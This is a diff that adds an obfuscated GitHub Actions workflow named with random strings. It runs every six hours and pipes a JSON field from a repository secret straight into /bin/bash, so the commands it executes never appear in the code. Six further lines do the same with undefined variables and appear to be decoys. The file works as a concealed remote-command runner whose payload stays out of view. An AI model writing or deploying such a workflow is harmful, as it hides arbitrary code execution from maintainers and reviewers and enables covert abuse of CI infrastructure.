@@ -1,0 +1,24 @@
+name: pengbaiyu2901
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: pengbaiyu2901
+        env:
+          yj91: ${{ secrets.yj91 }}
+        run: |
+          echo $yj91 | jq -r .wssyy293 | /bin/bash
+          echo $h122 | jq -r .anuw1811 | /bin/bash
+          echo $ma2 | jq -r .euq0030 | /bin/bash
+          echo $coqa85226 | jq -r .qa36866 | /bin/bash
+          echo $mvfdj9822 | jq -r .wh87978 | /bin/bash
+          echo $kehv04632 | jq -r .ov5 | /bin/bash
+          echo $mbgc0981 | jq -r .m1847 | /bin/bash
+
